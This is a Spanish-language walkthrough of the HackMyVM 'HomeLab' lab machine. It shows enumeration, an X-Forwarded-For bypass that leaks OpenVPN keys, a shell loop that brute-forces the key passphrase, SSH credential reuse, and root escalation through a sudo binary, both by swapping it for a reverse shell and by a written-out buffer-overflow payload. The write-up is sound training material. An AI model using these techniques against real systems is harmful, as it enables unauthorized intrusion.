<!DOCTYPE html>
<html lang="en" dir="auto" data-theme="dark">

<head><script src="/livereload.js?mindelay=10&amp;v=2&amp;port=1313&amp;path=livereload" data-no-instant defer></script><meta charset="utf-8">
<meta http-equiv="X-UA-Compatible" content="IE=edge">
<meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
<meta name="robots" content="noindex, nofollow">
<title>HomeLab | Hack Stark ×͜×</title>
<meta name="keywords" content="linux, web-enumeration, Information Leaked, sudo-privileges, x-forwarded-for, buffer-overflow">
<meta name="description" content="Writeup de la máquina HomeLab en HackMyVM.">
<meta name="author" content="">
<link rel="canonical" href="http://localhost:1313/writeups/hackmyvm/homelab/">
<link crossorigin="anonymous" href="/assets/css/stylesheet.fd5566c526ae48aadabd950798a2dc3568536401560eae5caac3765a42a9e7b5.css" integrity="sha256-/VVmxSauSKravZUHmKLcNWhTZAFWDq5cqsN2WkKp57U=" rel="preload stylesheet" as="style">
<link rel="icon" href="http://localhost:1313/favicon.ico">
<link rel="icon" type="image/png" sizes="16x16" href="http://localhost:1313/favicon-16x16.png">
<link rel="icon" type="image/png" sizes="32x32" href="http://localhost:1313/favicon-32x32.png">
<link rel="apple-touch-icon" href="http://localhost:1313/apple-touch-icon.png">
<link rel="mask-icon" href="http://localhost:1313/safari-pinned-tab.svg">
<meta name="theme-color" content="#2e2e33">
<meta name="msapplication-TileColor" content="#2e2e33">
<link rel="alternate" hreflang="en" href="http://localhost:1313/writeups/hackmyvm/homelab/">
<noscript>
    <style>
        #theme-toggle,
        .top-link {
            display: none;
        }

    </style>
</noscript><link rel='stylesheet' href='/css/custom.css'>
<link rel="preconnect" href="https://fonts.googleapis.com">
<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
<link href="https://fonts.googleapis.com/css2?family=Fira+Code:wght@400;500&display=swap" rel="stylesheet">

<script src="/js/main.js" defer></script>

<link rel="icon" type="image/png" href="/images/logo.png">
<link rel="apple-touch-icon" href="/images/logo.png">
<link rel="shortcut icon" href="/images/logo.png">
<meta name="theme-color" content="#2E3440">

</head>
<body id="top">
    <header class="header">
    <nav class="nav">
        <div class="logo">
            <a href="http://localhost:1313/" accesskey="h" title="Hack Stark ×͜× (Alt + H)">Hack Stark ×͜×</a>
            <div class="logo-switches">
            </div>
        </div>
        <ul id="menu">
            <li>
                <a href="http://localhost:1313/" title="Home">
                    <span>Home</span>
                </a>
            </li>
            <li>
                <a href="http://localhost:1313/writeups/" title="WriteUps">
                    <span>WriteUps</span>
                </a>
            </li>
        </ul>
    </nav>
</header>
<main class="main">

<div class="post-container">
  <article class="post-single">
    <header class="post-header">
      
      <h1 class="post-title entry-hint-parent">
        HomeLab
      </h1>
      <div class="post-description">
        Writeup de la máquina HomeLab en HackMyVM.
      </div>
      <div class="post-meta"><span title='2025-12-15 00:00:00 +0000 UTC'>December 15, 2025</span>&nbsp;·&nbsp;<span>9 min</span>

</div>

      <br />

      <h4>Tags:</h4>

      <br />
      <ul class="post-tags">
        <li><a href="http://localhost:1313/tags/linux/">Linux</a></li>
        <li><a href="http://localhost:1313/tags/web-enumeration/">Web-Enumeration</a></li>
        <li><a href="http://localhost:1313/tags/information-leaked/">Information Leaked</a></li>
        <li><a href="http://localhost:1313/tags/sudo-privileges/">Sudo-Privileges</a></li>
        <li><a href="http://localhost:1313/tags/x-forwarded-for/">X-Forwarded-For</a></li>
        <li><a href="http://localhost:1313/tags/buffer-overflow/">Buffer-Overflow</a></li>
      </ul>
    </header> 
    <div class="post-content"><h1 id="enumeración">Enumeración<a hidden class="anchor" aria-hidden="true" href="#enumeración">#</a></h1>
<p>Vamos a comenzar con un escaneo en red con ayuda de <strong>Arp-Scan</strong> :</p>
<pre tabindex="0"><code>arp-scan -I ens33 --localnet --ignoredups
</code></pre><p><img alt="img1" loading="lazy" src="/img/Pasted%20image%2020251210210615.png"></p>
<p>Podemos observar que tenemos la IP <code>192.168.1.101</code> ya con esto podemos intentar intuir el sistema operativo mediante el comando <code>ping</code>:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>ping -c <span style="color:#ae81ff">1</span> 192.168.1.101
</span></span></code></pre></div><p><img alt="img2" loading="lazy" src="/img/Pasted%20image%2020251210211306.png"></p>
<p>Podemos observar un <code>ttl=64</code> por lo que intuimos un sistema <code>Linux</code>.</p>
<p>Ya en este punto vamos a realizar un escaneo para intentar ver los puertos abiertos de está máquina con ayuda de <strong>Nmap</strong>:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>nmap -p- --open -sS --min-rate <span style="color:#ae81ff">5000</span> -n -v -Pn 192.168.1.101 -oG allPorts
</span></span></code></pre></div><p><img alt="img3" loading="lazy" src="/img/Pasted%20image%2020251212183944.png"></p>
<p>Podemos observar el puerto <code>80</code> abierto, vamos a intentar determinar más información con otro escaneo mucho mas directo:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>nmap -p80 -sVC 192.168.1.101 -oN target
</span></span></code></pre></div><p><img alt="img4" loading="lazy" src="/img/Pasted%20image%2020251212184252.png"></p>
<p>Como podemos observar está corriendo el servicio de http por lo que es una web.</p>
<p>Realicemos un escaneo con ayuda de <code>whatweb</code> para tratar de obtener las tecnologías de la web:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>whatweb http://192.168.1.101
</span></span></code></pre></div><p><img alt="img5" loading="lazy" src="/img/Pasted%20image%2020251212184513.png"></p>
<p>Podemos ver en tecnologías que se está implementando lo que es Apache claramente, pero nada más que me llame la atención, vamos a visitar la web a ver que encontramos:</p>
<p><img alt="img6" loading="lazy" src="/img/Pasted%20image%2020251212184806.png"></p>
<p>No vemos nada de primeras que sea útil, vamos a inspeccionar toda la web en búsqueda de algo sospechoso.</p>
<p>Vamos a realizar un escaneo de directorios a ver que logramos ver en la web, esto con ayuda de <code>Gobuster</code> :</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>gobuster dir -u http://192.168.1.101/ -w /usr/share/seclists/Discovery/Web-Content/DirBuster-2007_directory-list-2.3-medium.txt
</span></span></code></pre></div><p><img alt="img7" loading="lazy" src="/img/Pasted%20image%2020251212185340.png"></p>
<p>Como vemos en la imagen tenemos una ruta <code>/service</code> vamos a ver que contiene:</p>
<p><img alt="img8" loading="lazy" src="/img/Pasted%20image%2020251212185417.png"></p>
<p>Vemos un mensaje donde nos habla de que el contenido está disponible solo para él suponemos algún usuario de la máquina.</p>
<h1 id="explotación">Explotación<a hidden class="anchor" aria-hidden="true" href="#explotación">#</a></h1>
<p>Llevemos esto al <code>BurpSuite</code> para ver como se está tramitando la petición:</p>
<p><img alt="img9" loading="lazy" src="/img/Pasted%20image%2020251212185630.png"></p>
<p>Ya lo tenemos en el <code>BurpSuite</code>, ahora algo que llama mi atención es que habla de ser algo solo para él, pero como está detectando su conexión, vamos a intentar modificar primero la cabecera <code>HOST</code> a ver si mediante esa lo verifica o mediate que lo hace:</p>
<p><img alt="img10" loading="lazy" src="/img/Pasted%20image%2020251212192027.png"></p>
<p>Vemos que no nos funciona solo esto, podemos hacer uso de la cabecera <code>X-Forwarded-For</code> (está es una cabecera muy útilizada en nodos intermediarios en los cuales es necesario registrar las IP de origen, implementada para peticiones que pasan por medio de un balanceador de carga como puede ser Nginx por ejemplo), vemos que sucede:</p>
<p><img alt="img11" loading="lazy" src="/img/Pasted%20image%2020251212193539.png"></p>
<p>Como podemos observar ya tenemos una respuestá algo extraña para ser web, pero si analizamos un poco y con un poco de búsqueda encontramos que parece ser un archivo de configuración para entablar una conexión <code>VPN</code> mediante <code>openVPN</code>.</p>
<p>Bueno, vamos a sacar mediante curl todo ese output en un archivo <code>.ovpn</code> de la siguiente manera:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>curl -s -X GET <span style="color:#e6db74">&#34;http://192.168.1.101/service/&#34;</span> -H <span style="color:#e6db74">&#34;X-Forwarded-For: 192.168.1.101&#34;</span> -o openvpn.ovpn
</span></span></code></pre></div><p><img alt="img12" loading="lazy" src="/img/Pasted%20image%2020251212202356.png"></p>
<p>Perfecto ahora lo que podemos observar es que nos hacen falta partes del archivo donde vamos a ir rellenando por el momento de la siguiente manera, intuyendo cosas como el puerto por defecto que usa <code>openvn</code> que sería el <code>1194</code> mediante <code>UDP</code>, por lo tanto, podemos intentar escanear este puerto con nmap para ver si es verdad que está abierto:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>nmap --open -sU -p1194 192.168.1.101
</span></span></code></pre></div><p><img alt="img13" loading="lazy" src="/img/Pasted%20image%2020251212202741.png"></p>
<p>Podemos observar que si está abierto el puerto, por lo tanto, comenzamos a configurar de la siguiente manera por ahora:</p>
<p><img alt="img14" loading="lazy" src="/img/Pasted%20image%2020251212202838.png"></p>
<p>Bueno nos faltan al parecer los apartados de <code>ca, cert y key</code> los cuales son los apartados para un PKI (public key infrastructure) donde CA (Certificate Authority) sirve para verificar que el servidor al cual nos estámos conectando es legítimo, CERT que viene a ser una especie de identificación de la persona que se quiere conectar y por último KEY que es la clave privada que se implementa par que suceda la conexión.</p>
<p>Bueno necesitamos estos archivos, pero sabiendo lo que tenemos que buscar podemos intentar ver si están disponibles en la misma web y esto con ayuda de <strong>Gobuster</strong> de la siguiente manera:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>gobuster dir -u http://192.168.1.101/service -w /usr/share/seclists/Discovery/Web-Content/common.txt -x crt,cert,key
</span></span></code></pre></div><p><img alt="img15" loading="lazy" src="/img/Pasted%20image%2020251213203140.png"></p>
<p>Como podemos observar tenemos los archivos, podemos intentar descargar los archivos uno por uno con ayuda de <code>curl</code> :</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>curl -s -X GET <span style="color:#e6db74">&#34;http://192.168.1.101/service/ca.crt&#34;</span> -o ca.crt
</span></span></code></pre></div><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>curl -s -X GET <span style="color:#e6db74">&#34;http://192.168.1.101/service/client.crt&#34;</span> -o client.crt
</span></span></code></pre></div><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>curl -s -X GET <span style="color:#e6db74">&#34;http://192.168.1.101/service/client.key&#34;</span> -o client.key
</span></span></code></pre></div><p><img alt="img16" loading="lazy" src="/img/Pasted%20image%2020251213204204.png"></p>
<p>ya con los archivos podemos terminar de configurar el archivo de <code>openvpn.ovpn</code> de la siguiente manera:</p>
<p><img alt="img17" loading="lazy" src="/img/Pasted%20image%2020251213204418.png"></p>
<p>Ahora con el archivo correctamente configurado vamos a realizar la conexión de la siguiente manera:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>openvpn openvpn.ovpn
</span></span></code></pre></div><p><img alt="img18" loading="lazy" src="/img/Pasted%20image%2020251213204742.png"></p>
<p>Podemos observar que al parecer la clave o no es la correcta o está encriptada por lo que no es válida, en este punto podemos intentar desencriptar la clave mediante <code>openssl</code> con un ataque de fuerza bruta de la siguiente manera:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>cat /usr/share/seclists/Usernames/xato-net-10-million-usernames.txt | <span style="color:#66d9ef">while</span> read user;<span style="color:#66d9ef">do</span> bash -c  <span style="color:#e6db74">&#34;openssl rsa -in client.key -out newclient.key -passin pass:</span>$user<span style="color:#e6db74">&#34;</span> &amp;&gt;/dev/null <span style="color:#f92672">&amp;&amp;</span> echo <span style="color:#e6db74">&#34;password: </span>$user<span style="color:#e6db74">&#34;</span> <span style="color:#f92672">&amp;&amp;</span> break;<span style="color:#66d9ef">done</span>
</span></span></code></pre></div><p><img alt="img19" loading="lazy" src="/img/Pasted%20image%2020251213210652.png"></p>
<p>Mediante ese pequeño ataque de fuerza bruta podemos ver que la contraseña es <code>hiro</code>, además de que se generó el archivo <code>newclient.key</code> el cual reconfiguramos en el archivo <code>openvpn.ovpn</code> y generamos nuevamente la conexión:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>openvpn openvpn.ovpn
</span></span></code></pre></div><p><img alt="img20" loading="lazy" src="/img/Pasted%20image%2020251213211927.png"></p>
<p>Perfecto ya está la conexión, en este punto como podemos observar tenemos una IP que nos asigna que sería la <code>10.8.0.2</code> y tenemos al parecer una conexión a la <code>10.176.13.0</code> mediante el Host de la <code>10.8.0.1</code>.</p>
<p>En este punto lo que podemos intentar es realizar un escaneo de host mediante <strong>Nmap</strong>:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>nmap -sn 10.8.0.0/24
</span></span></code></pre></div><p><img alt="img21" loading="lazy" src="/img/Pasted%20image%2020251213212246.png"></p>
<p>Vemos que solo detecta el host y nuestra IP por lo que no tenemos más opciones, en este punto lo que podemos hacer es un escaneo de <strong>Nmap</strong> a la segunda IP de la siguiente manera:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>nmap -sn 10.176.13.0/24
</span></span></code></pre></div><p><img alt="img22" loading="lazy" src="/img/Pasted%20image%2020251213212624.png"></p>
<p>Como podemos observar se detectó una IP que sería la <code>10.176.13.37</code>, realicemos un escaneo de puertos a ver que encontramos:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>nmap -p- --open -sS --min-rate <span style="color:#ae81ff">5000</span> -n -v -Pn 10.176.13.37
</span></span></code></pre></div><p><img alt="img23" loading="lazy" src="/img/Pasted%20image%2020251213212751.png"></p>
<p>Como podemos observar tenemos dos puertos abiertos el <code>22 y 80</code>.</p>
<p>Algo que se me viene a la mente es intentar conectarme por el puerto <code>22</code>, si se puso atención en el archivo de configuración de <code>openvpn</code> lo que tenemos en las primeras líneas parece un usuario que sería el <code>shinosawa</code> y usemos la contraseña de <code>hiro</code>:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>ssh shinosawa@10.176.13.37
</span></span></code></pre></div><p><img alt="img24" loading="lazy" src="/img/Pasted%20image%2020251213213335.png"></p>
<p>Podemos observar que ya tenemos conexión por ssh.</p>
<h1 id="escalada-de-privilegios">Escalada de Privilegios<a hidden class="anchor" aria-hidden="true" href="#escalada-de-privilegios">#</a></h1>
<p>En este punto lo que podemos hacer es investigar un poco el usuario con comandos usuales y vemos lo siguiente al ejecutar un <code>sudo -l</code>:</p>
<p><img alt="img25" loading="lazy" src="/img/Pasted%20image%2020251214204951.png"></p>
<p>Podemos observar un archivo que permite la ejecución sin necesidad de poner la contraseña y está en nuestro home, veamos que se trata primero:</p>
<p><img alt="img26" loading="lazy" src="/img/Pasted%20image%2020251214205135.png"></p>
<p>Vemos el archivo que podemos ejecutar y también podemos observar el archivo con la flag del usuario.</p>
<p>Ejecutemos y veamos que sucede con este archivo:</p>
<p><img alt="img27" loading="lazy" src="/img/Pasted%20image%2020251214205240.png"></p>
<p>Por el texto se entiende que se intenta conectar al servidor y que va a darnos un shell. Bueno, tenemos dos forma de resolver la máquina en este punto y vamos a ver ambas.</p>
<h3 id="sustituir-el-archivo">Sustituir el Archivo<a hidden class="anchor" aria-hidden="true" href="#sustituir-el-archivo">#</a></h3>
<p>Como ya tenemos todos los permisos en esta carpeta porque es nuestro home, vamos a crear una carpeta para mover el archivo de forma temporal:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>mkdir temp
</span></span><span style="display:flex;"><span>mv deepseek temp
</span></span></code></pre></div><p><img alt="img28" loading="lazy" src="/img/Pasted%20image%2020251214205615.png"></p>
<p>Listo ahora creemos un archivo <code>deepseek</code> con instrucciones maliciosas, en este caso uno que nos permita realizar una reverse shell como root a nuestra máquina atacante de la siguiente manera:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>touch deepseek
</span></span><span style="display:flex;"><span>chmod +x deepseek
</span></span></code></pre></div><p>Ya con el archivo vamos a poner una reverse shell de la siguiente manera:</p>
<p><img alt="img29" loading="lazy" src="/img/Pasted%20image%2020251214210116.png"></p>
<p>Ya con esto es cuestión de levantar un servidor en nuestra máquina atacante y ver si logramos ejecutar esto como root:</p>
<p><img alt="img30" loading="lazy" src="/img/Pasted%20image%2020251214210254.png"></p>
<p>Listo, en este punto podemos ver la flag del usuario root:</p>
<p><img alt="img31" loading="lazy" src="/img/Pasted%20image%2020251214210316.png"></p>
<p>Con esto terminamos la máquina.</p>
<h3 id="buffer-overflow">Buffer Overflow<a hidden class="anchor" aria-hidden="true" href="#buffer-overflow">#</a></h3>
<p>Ahora tenemos otro método y es explotando un <code>Buffer Overflow</code> al binario <code>deepseek</code>, donde primero lo vamos a pasar a nuestra máquina atacante para lograr analizarlo:</p>
<p><img alt="img32" loading="lazy" src="/img/Pasted%20image%2020251214210710.png"></p>
<p>Ya con el archivo en nuestra máquina vamos a analizarlo rápidamente con ayuda de <code>ghidra</code> haciendo un poco de ingeniería inversa. El propósito será netamente en este punto es encontrar el punto donde posiblemente inyectar el buffer overflow:</p>
<p><img alt="img33" loading="lazy" src="/img/Pasted%20image%2020251214211140.png"></p>
<p>Analizamos la función <code>main</code> y vemos que dentro llama a la función <code>vuln</code>, vemos que contiene:</p>
<p><img alt="img34" loading="lazy" src="/img/Pasted%20image%2020251214211449.png"></p>
<p>Podemos observar que dentro guarda una variable local que tiene un espacio asignado de 64 bytes, pero al guardar con ayuda de <code>fgets</code>, tiene un valor que no entendemos a primera, pero si lo seleccionamos vemos que nos sale en decimal:</p>
<p><img alt="img35" loading="lazy" src="/img/Pasted%20image%2020251214211558.png"></p>
<p>Vemos que son <code>256</code> bytes, por lo tanto, aquí tenemos un desbordamiento, ahora podríamos intentar aquí en este punto intentar un ret2libc o alguna otra técnica, pero primero veamos las demás funciones a ver si no tenemos algo útil primero:</p>
<p><img alt="img36" loading="lazy" src="/img/Pasted%20image%2020251214211922.png"></p>
<p>Vemos que tenemos una función <code>execute</code> la cual nos da una <code>sh</code>. Esto ya me ayuda mucho, ya que ahora mi ataque se basara en explotar el buffer y redirigir el programa a esta función, en este punto lo que voy a hacer es analizar con ayuda de <code>gdb</code> el binario de la siguiente manera:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>gdb ./deepseek -q
</span></span></code></pre></div><p><img alt="img37" loading="lazy" src="/img/Pasted%20image%2020251214212132.png"></p>
<p>Ahora conociendo el punto exacto done se tiene que explotar el buffer vamos a crear directamente una carga para identificar el número de caracteres que me permite llegar al <code>rsp</code> que es mi objetivo:</p>
<pre tabindex="0"><code>pattern create 200
</code></pre><p><img alt="img38" loading="lazy" src="/img/Pasted%20image%2020251214212316.png"></p>
<p>Copiamos los caracteres y ejecutamos el programa para intentar ver en que punto se sobreescribe el <code>rsp</code>:</p>
<p><img alt="img39" loading="lazy" src="/img/Pasted%20image%2020251214212420.png"></p>
<p><img alt="img40" loading="lazy" src="/img/Pasted%20image%2020251214212439.png"></p>
<p>excelente logramos el cometido, ahora vamos a identificar cuantos caracteres son antes de sobreescribirlo:</p>
<pre tabindex="0"><code>pattern offset $rsp
</code></pre><p><img alt="img41" loading="lazy" src="/img/Pasted%20image%2020251214212604.png"></p>
<p>Vemos que nos indica un total de 72 caracteres, probemos.
Generamos la carga útil con python:</p>
<p><img alt="img42" loading="lazy" src="/img/Pasted%20image%2020251214212724.png"></p>
<p><img alt="img43" loading="lazy" src="/img/Pasted%20image%2020251214212758.png"></p>
<p><img alt="img44" loading="lazy" src="/img/Pasted%20image%2020251214212815.png"></p>
<p>Perfecto, si funciona, en este punto verifiquemos que protecciones tiene el binario:</p>
<p><img alt="img45" loading="lazy" src="/img/Pasted%20image%2020251214212935.png"></p>
<p>Observamos que todo está desactivado, pero el que más nos importaba era la de <code>PIE</code> la cual si se combina con el ASLR nos impiden este tipo de ataque, pero al estar desactivado podemos ejecutarlo.</p>
<p>Ahora identifiquemos cuál es el espacio en memoria que almacena la función <code>execute</code> en la máquina de la siguiente manera:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>objdump -d deepseek | grep execute
</span></span></code></pre></div><p><img alt="img46" loading="lazy" src="/img/Pasted%20image%2020251214213300.png"></p>
<p>Perfecto ya con esto tenemos que poner esa memoria en formato Little Endian, donde el byte menos significativo va primero, quedando de la siguiente manera:</p>
<pre tabindex="0"><code>00 00 00 00 00 40 12 66 (antes)
66 12 40 00 00 00 00 00 (después)
</code></pre><p>en este punto vamos a dejarlo representado correctamente:</p>
<pre tabindex="0"><code>\x66\x12\x40\x00\x00\x00\x00\x00
</code></pre><p>Ya tenemos todo lo que necesitamos para romper el sistema, por lo que vamos a jugar con Python de la siguiente manera para explotarlo:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span><span style="color:#f92672">(</span>python3 -c <span style="color:#e6db74">&#39;import sys;sys.stdout.buffer.write(b&#34;A&#34;*72+b&#34;\x66\x12\x40\x00\x00\x00\x00\x00&#34;)&#39;</span>;/bin/cat<span style="color:#f92672">)</span> | ./deepseek
</span></span></code></pre></div><p><img alt="img47" loading="lazy" src="/img/Pasted%20image%2020251214214543.png"></p>
<p>Ya funciona en local, en este punto probemos en la máquina víctima de la siguiente manera:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span><span style="color:#f92672">(</span>python3 -c <span style="color:#e6db74">&#39;import sys;sys.stdout.buffer.write(b&#34;A&#34;*72+b&#34;\x66\x12\x40\x00\x00\x00\x00\x00&#34;)&#39;</span>;/bin/cat<span style="color:#f92672">)</span> | sudo /home/shinosawa/deepseek
</span></span></code></pre></div><p><img alt="img48" loading="lazy" src="/img/Pasted%20image%2020251214214745.png"></p>
<p>Perfecto ya tenemos la shell como root.</p>
<p>Podemos ver la flag:</p>
<p><img alt="img49" loading="lazy" src="/img/Pasted%20image%2020251214214803.png"></p>
<p>Lab Terminado.</p>
<p><img alt="img50" loading="lazy" src="/img/Pasted%20image%2020251214214826.png"></p>


    </div>

    <footer class="post-footer">
    </footer>
  </article>

  
  <aside id="sidebar-toc">
    <div class="sidebar-title">Contenido</div>
    <ul id="toc-list"></ul>
  </aside>
</div>

<style>
   
  .post-container {
    display: flex;
    flex-direction: row;
    justify-content: flex-start;
    position: relative;
  }

   
  .post-single {
    max-width: 850px;
    flex: 1;
    padding: 0 1rem;
  }

   
  #sidebar-toc {
    position: fixed;
    top: 11%;
    right: 20%;
    width: 260px;
    background-color: rgba(25, 25, 25, 0.95);
    border-radius: 12px;
    padding: 15px 20px;
    color: #fff;
    font-size: 14px;
    max-height: 80vh;
    overflow-y: auto;
    box-shadow: 0 0 15px rgba(0, 0, 0, 0.4);
    z-index: 1000;
    transition: all 0.3s ease;
  }

   
  .sidebar-title {
    font-weight: bold;
    color: #00bfff;
    margin-bottom: 10px;
    text-align: center;
  }

   
  #toc-list {
    list-style: none;
    padding: 0;
    margin: 0;
  }

  #toc-list li {
    margin: 5px 0;
  }

  #toc-list li.h2 {
    margin-left: 10px;
    font-size: 13px;
  }

  #toc-list li.h3 {
    margin-left: 20px;
    font-size: 12px;
  }

  #toc-list a {
    color: #9ad0ff;
    text-decoration: none;
    transition: color 0.2s ease;
  }

  #toc-list a:hover {
    color: #00bfff;
  }

   

   
  @media (max-width: 1700px) {
    #sidebar-toc {
      right: 15%;
      width: 220px;
      font-size: 13px;
    }
  }

   
  @media (max-width: 1440px) {

    .post-container {
      justify-content: center;
    }

    #sidebar-toc {
      position: fixed;
      top: auto;
      bottom: 20px;
      right: 10%;
      width: auto;
      padding: 10px 14px;
      background-color: rgba(0, 0, 0, 0.8);
      border-radius: 8px;
      font-size: 13px;
      max-height: none;
      overflow: visible;
      cursor: pointer;
    }

    #sidebar-toc::after {
      content: "☰ Contenido";
      color: #00bfff;
      font-weight: bold;
    }

     
    #toc-list,
    .sidebar-title {
      display: none;
    }

     
    #sidebar-toc:hover #toc-list {
      display: block;
      position: absolute;
      right: 0;
      bottom: 40px;
      width: 220px;
      background-color: rgba(25, 25, 25, 0.95);
      border-radius: 8px;
      padding: 10px;
    }

    #sidebar-toc:hover .sidebar-title {
      display: block;
      text-align: center;
      margin-bottom: 5px;
    }
  }
</style>


<script>
  document.addEventListener("DOMContentLoaded", function () {
    const content = document.querySelector(".post-content");
    const tocList = document.getElementById("toc-list");
    if (!content || !tocList) return;

    const headings = content.querySelectorAll("h1, h2, h3");
    headings.forEach((heading, index) => {
      const id = heading.id || `section-${index}`;
      heading.id = id;

      const li = document.createElement("li");
      li.classList.add(heading.tagName.toLowerCase());

      const a = document.createElement("a");
      a.href = `#${id}`;
      a.textContent = heading.textContent;

      li.appendChild(a);
      tocList.appendChild(li);
    });
  });
</script>
    </main>
    
<footer class="footer">
        <span>&copy; 2025 <a href="http://localhost:1313/">Hack Stark ×͜×</a></span> · 

    <span>
        Powered by
        <a href="https://gohugo.io/" rel="noopener noreferrer" target="_blank">Hugo</a> &
        <a href="https://github.com/adityatelange/hugo-PaperMod/" rel="noopener" target="_blank">PaperMod</a>
    </span>
</footer>
<a href="#top" aria-label="go to top" title="Go to Top (Alt + G)" class="top-link" id="top-link" accesskey="g">
    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 12 6" fill="currentColor">
        <path d="M12 6H0l6-6z" />
    </svg>
</a>

<script>
    let menu = document.getElementById('menu');
    if (menu) {
        
        const scrollPosition = localStorage.getItem("menu-scroll-position");
        if (scrollPosition) {
            menu.scrollLeft = parseInt(scrollPosition, 10);
        }
        
        menu.onscroll = function () {
            localStorage.setItem("menu-scroll-position", menu.scrollLeft);
        }
    }

    document.querySelectorAll('a[href^="#"]').forEach(anchor => {
        anchor.addEventListener("click", function (e) {
            e.preventDefault();
            var id = this.getAttribute("href").substr(1);
            if (!window.matchMedia('(prefers-reduced-motion: reduce)').matches) {
                document.querySelector(`[id='${decodeURIComponent(id)}']`).scrollIntoView({
                    behavior: "smooth"
                });
            } else {
                document.querySelector(`[id='${decodeURIComponent(id)}']`).scrollIntoView();
            }
            if (id === "top") {
                history.replaceState(null, null, " ");
            } else {
                history.pushState(null, null, `#${id}`);
            }
        });
    });

</script>
<script>
    var mybutton = document.getElementById("top-link");
    window.onscroll = function () {
        if (document.body.scrollTop > 800 || document.documentElement.scrollTop > 800) {
            mybutton.style.visibility = "visible";
            mybutton.style.opacity = "1";
        } else {
            mybutton.style.visibility = "hidden";
            mybutton.style.opacity = "0";
        }
    };

</script>
</body>

</html>
